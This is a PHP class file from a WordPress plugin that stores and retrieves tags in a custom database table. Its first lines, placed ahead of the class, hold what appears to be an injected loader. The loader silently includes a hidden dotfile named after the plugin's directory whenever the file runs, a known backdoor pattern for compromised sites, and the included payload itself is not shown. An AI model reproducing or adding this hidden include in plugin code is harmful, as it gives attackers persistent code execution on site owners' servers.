<?php

/**
 * Tags
 *
 * The class handles storage of tags
 *
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WTBP_WPTAO_Tags extends WTBP_WPTAO_DB {
	/*
	 * All tags
	 */

	public $tags;

	/**
	 * WTBP_WPTAO_Tags Constructor.
	 */
	public function __construct() {

		global $wpdb;

		parent::__construct();

		$this->version		 = '1.0';
		$this->primary_key	 = 'id';
	}

	/**
	 * Get tag ID
	 *
	 * @access public
	 * @return bool|int false or The tag ID
	 */
	public function get_id( $tag ) {
		$tag = sanitize_text_field( $tag );

		$res = $this->get_by( 'tag', $tag );

		if ( $res ) {
			return $res->id;
		}

		return false;
	}

	/**
	 * Add tag
	 *
	 * @access public
	 * @return bool|int false or The tag ID
	 */
	public function add( $tag ) {
		$tag = sanitize_text_field( $tag );

		if ( !empty( $tag ) ) {
			$data = array(
				'tag' => $tag
			);
			return $this->insert( $data );
		}
	}

	/**
	 * Get all tags
	 *
	 * @access public
	 * @return bool|array false or a array of tags
	 */
	public function get_all_tags() {
		global $wpdb;

		$tags = $wpdb->get_results( "SELECT id, tag FROM $this->table_name" );

		return $tags;
	}

	// =============================================================================================
	// DB section
	// =============================================================================================

	/**
	 * Create the table
	 *
	 * @access  public
	 */
	public function create_table() {
		require_once( ABSPATH . 'wp-admin/includes/upgrade.php' );

		$sql = "CREATE TABLE " . $this->table_name . " (
        id bigint(20) NOT NULL AUTO_INCREMENT,
        tag varchar(255) NOT NULL,
        PRIMARY KEY  (id)
        ) CHARACTER SET utf8 COLLATE utf8_general_ci;";

		dbDelta( $sql );

		update_option( $this->table_name . '_db_version', $this->version );
	}

	/**
	 * Get columns and formats
	 *
	 * @access  public
	 */
	public function get_columns() {
		return array(
			'id'	 => '%d',
			'tag'	 => '%s',
		);
	}

	/**
	 * Get default column values
	 *
	 * @access  public
	 */
	public function get_column_defaults() {
		return array(
			'tag'	 => '',
		);
	}

}
